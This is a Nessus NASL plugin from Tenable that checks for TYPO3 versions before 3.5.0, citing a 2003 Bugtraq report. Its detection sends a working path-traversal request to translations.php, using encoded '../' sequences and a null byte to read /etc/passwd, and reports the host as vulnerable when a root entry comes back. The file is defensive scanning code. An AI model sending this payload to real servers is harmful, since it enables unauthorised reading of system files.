#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

# From: Martin Eiszner <martin@websec.org>
# To: bugtraq@securityfocus.com
# Subject: typo3 issues
# Message-Id: <20030228103704.1b657228.martin@websec.org>

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(11284);
  script_version("1.27");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(
    6982,
    6983,
    6984,
    6985,
    6986,
    6988,
    6993
  );

  script_name(english:"TYPO3 < 3.5.0 Multiple Vulnerabilities");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has a PHP script that is affected by multiple
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running an old version of TYPO3.

An attacker can use it to read arbitrary files and execute arbitrary
commands on this host.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TYPO3 3.5.0.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Score based on analysis of the vendor advisory.");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2003/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:typo3:typo3");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("typo3_detect.nasl");
  script_require_keys("installed_sw/TYPO3", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

app = "TYPO3";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(qs:dir, port:port);

file = "/etc/passwd";

url = dir+'/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e' + file + '%00';
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

if (egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
{
  report = NULL;
  attach_file = NULL;
  output = NULL;
  req = http_last_sent_request();
  request = NULL;

  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url, port:port);
    if (report_verbosity > 1)
    {
      output = data_protection::redact_etc_passwd(output:res[2]);
      attach_file = file;
      request = make_list(req);
    }
  }

  security_report_v4(port:port,
                     extra:report,
                     severity:SECURITY_HOLE,
                     request:request,
                     file:attach_file,
                     output:output);

  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
